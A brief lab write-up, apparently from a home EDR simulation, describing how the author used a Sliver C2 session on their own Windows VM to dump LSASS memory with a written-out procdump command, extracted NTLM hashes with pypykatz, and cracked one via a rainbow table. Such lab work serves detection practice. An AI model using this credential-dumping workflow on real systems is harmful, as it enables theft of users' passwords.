# EDR Simulation Extra
## Cracking the Windows password obtained from an LSASS memory dump
Per the main write-up, I executed a C2 payload on the Windows machine via command prompt with Administrative privileges. This granted me high-level access from the Ubuntu attack server running Sliver. 

I was then able to dump the memory contents of LSASS, a process containing sensitive information such as user credentials:
```console
[server] sliver (C2_PAYLOAD_NAME) > procdump -n lsass.exe -s lsass.dmp
```
The dump file was saved as **lsass.dmp** on my attack machine. I then transferred this dump file to a separate Windows host machine for further processing.

For processing the file, I used **pypykatz**, a Python implementation of the post-exploitation tool called Mimikatz. Running pypykatz revealed the names of the users along with their NTLM password hashes.

Rather than brute-forcing, I looked up the hash on a rainbow table, revealing the decrypted password that I had set for the Windows VM:
  ![hash-cracked](https://github.com/user-attachments/assets/a209f991-d7eb-449e-b3d8-9776ef5d225e)
